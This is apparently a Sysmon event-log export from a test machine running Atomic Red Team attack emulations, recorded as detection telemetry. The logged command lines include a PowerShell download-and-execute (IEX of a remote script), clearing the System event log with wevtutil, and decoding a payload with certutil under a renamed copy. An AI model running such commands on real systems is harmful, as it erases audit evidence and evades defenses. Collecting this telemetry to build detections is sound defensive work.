"TimeCreated","Id","Message"
"12/17/2025 8:19:08 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:08.470
ProcessGuid: {f995aebf-677c-6942-e607-000000000e00}
ProcessId: 9148
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing)
Invoke-Maldoc -macroFile \""""C:\AtomicRedTeam\atomics\T1070.001\src\T1070.001-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""ClearLogs\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:07 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:07.930
ProcessGuid: {f995aebf-677b-6942-e407-000000000e00}
ProcessId: 9588
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_t0wlsz52.ibv.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:07 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:07.579
ProcessGuid: {f995aebf-677b-6942-e307-000000000e00}
ProcessId: 6780
Image: C:\Windows\System32\wevtutil.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Event Log Utility
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: wevtutil.exe
CommandLine: wevtutil  cl System
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=3C4C4FE2FC5590A6AF5E5F73B7277DA8785695E6A131D255943A88E43CDD2A6A
ParentProcessGuid: {f995aebf-677b-6942-e107-000000000e00}
ParentProcessId: 4484
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c wevtutil cl System
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:07 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:07.394
ProcessGuid: {f995aebf-677b-6942-e007-000000000e00}
ProcessId: 7632
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:07 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:07.375
ProcessGuid: {f995aebf-677b-6942-df07-000000000e00}
ProcessId: 5432
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:05 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:05.244
ProcessGuid: {f995aebf-6779-6942-db07-000000000e00}
ProcessId: 1716
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2_decoded.exe
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
IsExecutable: true
Archived: true"
"12/17/2025 8:19:05 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:05.023
ProcessGuid: {f995aebf-6778-6942-d907-000000000e00}
ProcessId: 8472
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc_decoded.exe
Hashes: SHA256=81BD48985FA1753E9E2158A7CF969141EDDDBD050E976801BB477E24A2A06B2A
IsExecutable: true
Archived: true"
"12/17/2025 8:19:04 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:04.759
ProcessGuid: {f995aebf-6778-6942-d807-000000000e00}
ProcessId: 8400
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:04 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:04.739
ProcessGuid: {f995aebf-6778-6942-d707-000000000e00}
ProcessId: 4572
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:59 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:59.718
ProcessGuid: {f995aebf-6773-6942-d507-000000000e00}
ProcessId: 588
Image: C:\Windows\System32\makecab.exe
FileVersion: 5.00 (WinBuild.160101.0800)
Description: Microsoft? Cabinet Maker
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: makecab.exe
CommandLine: makecab  ""C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt"" ""C:\Users\RUNNER~1\AppData\Local\Temp\art-expand-test.cab"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=070A98B4F7C03F99048A10F490D5916A9A98417E0D0DE2C414C76B3DD00CB35E
ParentProcessGuid: {f995aebf-6773-6942-d307-000000000e00}
ParentProcessId: 8592
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c mkdir ""%TEMP%\art-expand-out"" >nul 2>&1 & echo hello from atomic red team > ""C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt"" & makecab ""C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt"" ""%TEMP%\art-expand-test.cab"" & pushd ""%TEMP%\art-expand-out"" & expand ""%TEMP%\art-expand-test.cab"" -F:* . & popd
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:59 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:18:59.423
ProcessGuid: {f995aebf-6773-6942-d207-000000000e00}
ProcessId: 8748
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
ImageLoaded: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:59 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:59.419
ProcessGuid: {f995aebf-6773-6942-d207-000000000e00}
ProcessId: 8748
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp  -decode C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2.txt C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2_decoded.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-6773-6942-cf07-000000000e00}
ParentProcessId: 8844
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c copy %windir%\system32\certutil.exe %temp%\tcm.tmp & %temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt & %temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:59 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:18:59.379
ProcessGuid: {f995aebf-6773-6942-d107-000000000e00}
ProcessId: 6544
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
ImageLoaded: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:59 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:59.375
ProcessGuid: {f995aebf-6773-6942-d107-000000000e00}
ProcessId: 6544
Image: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: C:\Users\RUNNER~1\AppData\Local\Temp\tcm.tmp  -encode C:\Windows\System32\calc.exe C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc2.txt 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-6773-6942-cf07-000000000e00}
ParentProcessId: 8844
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c copy %windir%\system32\certutil.exe %temp%\tcm.tmp & %temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt & %temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:59 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:59.334
ProcessGuid: {f995aebf-6773-6942-cf07-000000000e00}
ProcessId: 8844
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c copy %%windir%%\system32\certutil.exe %%temp%%\tcm.tmp & %%temp%%\tcm.tmp -encode C:\Windows\System32\calc.exe %%temp%%\T1140_calc2.txt & %%temp%%\tcm.tmp -decode %%temp%%\T1140_calc2.txt %%temp%%\T1140_calc2_decoded.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:59 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:59.011
ProcessGuid: {f995aebf-6773-6942-ce07-000000000e00}
ProcessId: 6692
Image: C:\Windows\System32\certutil.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: certutil  -decode C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc.txt C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc_decoded.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-6772-6942-cb07-000000000e00}
ParentProcessId: 3688
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt & certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:58 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:58.940
ProcessGuid: {f995aebf-6772-6942-cd07-000000000e00}
ProcessId: 1412
Image: C:\Windows\System32\certutil.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: certutil  -encode C:\Windows\System32\calc.exe C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc.txt 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-6772-6942-cb07-000000000e00}
ParentProcessId: 3688
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt & certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:58 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:58.910
ProcessGuid: {f995aebf-6772-6942-cb07-000000000e00}
ProcessId: 3688
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c certutil -encode C:\Windows\System32\calc.exe %%temp%%\T1140_calc.txt & certutil -decode %%temp%%\T1140_calc.txt %%temp%%\T1140_calc_decoded.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:58 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:58.457
ProcessGuid: {f995aebf-6772-6942-ca07-000000000e00}
ProcessId: 5056
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:58 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:18:58.437
ProcessGuid: {f995aebf-6772-6942-c907-000000000e00}
ProcessId: 5052
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:56 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:18:56.450
ProcessGuid: {f995aebf-6770-6942-c807-000000000e00}
ProcessId: 7368
Image: C:\Windows\System32\taskkill.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:56 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:18:56.430
ProcessGuid: {f995aebf-6770-6942-c807-000000000e00}
ProcessId: 7368
Image: C:\Windows\System32\taskkill.exe
ImageLoaded: C:\Windows\System32\dbghelp.dll
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows Image Helper
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: DBGHELP.DLL
Hashes: SHA256=C821A11C26E939E7A2E96C7E68A9FCEADF39AB6873140951902D2A676381D9C9
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:18:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:55.902
ProcessGuid: {f995aebf-676f-6942-c407-000000000e00}
ProcessId: 2732
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ipw1djsl.hes.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:55.506
ProcessGuid: {f995aebf-676f-6942-c207-000000000e00}
ProcessId: 4932
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_eozq2suc.djm.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:55.126
ProcessGuid: {f995aebf-676f-6942-c007-000000000e00}
ProcessId: 10020
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_u5jzbrrk.4fx.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:54 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:18:54.736
ProcessGuid: {f995aebf-676e-6942-be07-000000000e00}
ProcessId: 3816
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_zzojhvi1.dlp.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:18:54 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:18:54.396
ProcessGuid: {f995aebf-676e-6942-bd07-000000000e00}
ProcessId: 8612
Image: C:\Windows\System32\taskkill.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25110.5-0\MpOAV.dll
FileVersion: 4.18.25110.5 (4a6978a838df7287d907bb2ee8a2eeb2373b186e)
Description: IOfficeAntiVirus Module
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: MpOAV.dll
Hashes: SHA256=0EF8AE9CC8E3722C0AE09B55531BBA2F2A3422CCF4A1BB9B37ABDB4808AAC232
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
